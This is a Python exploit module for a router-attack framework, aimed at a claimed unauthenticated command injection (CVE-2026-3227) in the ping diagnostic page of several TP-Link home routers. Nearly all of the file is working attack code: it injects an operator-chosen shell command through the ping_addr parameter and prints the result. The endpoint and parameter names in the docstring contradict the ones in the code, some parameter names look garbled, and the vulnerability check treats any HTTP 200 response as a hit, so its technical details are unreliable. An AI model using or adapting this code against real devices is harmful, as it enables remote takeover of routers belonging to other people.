# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TP-Link TL-WR802N/TL-WR841N/TL-WR840N Command Injection (CVE-2026-3227).

    The web management interface of several TP-Link wireless routers
    contains an unauthenticated command injection vulnerability in the
    diagnostic ping functionality. The ``ip`` parameter in the
    ``/userRpm/PingIfr498498.htm`` endpoint is passed to a system()
    call without sanitization, allowing arbitrary OS command execution.

    Affected models: TL-WR802N, TL-WR841N, TL-WR840N (firmware <= 2026.01).

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TP-Link TL-WR802N/841N/840N Ping Command Injection (CVE-2026-3227)",
        "description": (
            "Exploits CVE-2026-3227 via unauthenticated command injection "
            "in the diagnostic ping endpoint of TP-Link TL-WR802N, "
            "TL-WR841N, and TL-WR840N routers. The ip parameter is "
            "passed unsanitized to system(), enabling arbitrary OS "
            "command execution without credentials."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-3227",
            "https://www.tp-link.com/us/support/download/",
        ),
        "disclosure_date": "2026-01-20",
        "platform": "linux",
        "arch": "mips",
        "privileged": True,
        "targets": (
            "TP-Link TL-WR802N (firmware <= 2026.01)",
            "TP-Link TL-WR841N (firmware <= 2026.01)",
            "TP-Link TL-WR840N (firmware <= 2026.01)",
        ),
    }

    target = OptIP("", "Target IPv4 address of the TP-Link router")
    port = OptPort(80, "Target HTTP port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject via ping diagnostic")

    _PING_PATH = "/userRpm/PingIframeRpm.htm"

    def _build_url(self, path: str) -> str:
        return f"http://{self.target}:{self.port}{path}"

    def _http_get(self, path: str, params: dict | None = None) -> tuple[int, str]:
        url = self._build_url(path)
        if params:
            url += "?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "Mozilla/5.0")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    @mute
    def check(self) -> bool:
        """Probe the target for the ping diagnostic endpoint."""
        try:
            status, body = self._http_get(self._PING_PATH)
            if status == 200 and "ping" in body.lower():
                return True
            return status == 200
        except Exception:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target at {self.target}:{self.port} does not expose "
                f"the ping diagnostic endpoint"
            )
            return

        print_success("Vulnerable ping diagnostic endpoint detected")
        self._exploit()

    def _exploit(self) -> None:
        injected = f"127.0.0.1;{self.command};"

        params = {
            "ping_addr": injected,
            "doType": "ping",
            "is498498": "1",
            "clear498498": "0",
        }

        print_status(
            f"Injecting command via ping_addr: {injected!r}"
        )

        status, body = self._http_get(self._PING_PATH, params)

        if status == 200:
            print_success(
                f"HTTP {status} returned. Command '{self.command}' "
                f"should have executed on the target."
            )
            if body.strip():
                for line in body[:2048].splitlines():
                    print_info(f"  {line}")
        elif status == 0:
            print_error("No response; target may have crashed or timed out")
        else:
            print_error(f"Unexpected HTTP {status}")
